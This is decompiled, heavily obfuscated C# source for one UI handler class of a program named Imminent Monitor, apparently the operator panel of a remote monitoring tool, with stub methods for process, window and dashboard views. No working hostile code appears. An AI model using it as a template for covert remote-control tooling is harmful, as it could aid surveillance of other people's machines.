// Decompiled with JetBrains decompiler
// Type: ImminentMonitor.Cef.SystemManagerCefHandler
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

namespace ImminentMonitor.Cef
{
  public class SystemManagerCefHandler
  {
    public NewFormSystemManagers SystemManagers;

    public SystemManagerCefHandler(NewFormSystemManagers systemManagers) => this.SystemManagers = systemManagers;

    public void handleTab(string id)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) id
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "R[]J(Pa.Q$", object_3);
    }

    public void loadSystemInformation()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "FKq!mPa.Q$", object_3);
    }

    public void loadDashBoard()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "\\=o(LPa.Q$", object_3);
    }

    public void loadProcessManager()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "GbpRePa.Q$", object_3);
    }

    public void loadWindowManager()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "+KCTgPa.Q$", object_3);
    }

    private object GetTabData(string id)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) id
      };
      return Class86.smethod_0().method_270(Class86.smethod_1(), "&>,,LPa.Q$", object_3);
    }

    private void LoadTabData(string html, string id)
    {
      object[] object_3 = new object[3]
      {
        (object) this,
        (object) html,
        (object) id
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "recl&Pa.Q$", object_3);
    }

    private void LoadTabData(string html)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) html
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "oSAZoPa.Q$", object_3);
    }

    private void ShowCommand(int index)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) index
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "(:00fPa.Q$", object_3);
    }

    public void hideMainInterface()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "K[GsHPa.Q$", object_3);
    }

    public void refreshDashboard()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "Qe@OcPa.Q$", object_3);
    }

    public void deleteDashboard()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "VSSFZPa.Q$", object_3);
    }
  }
}
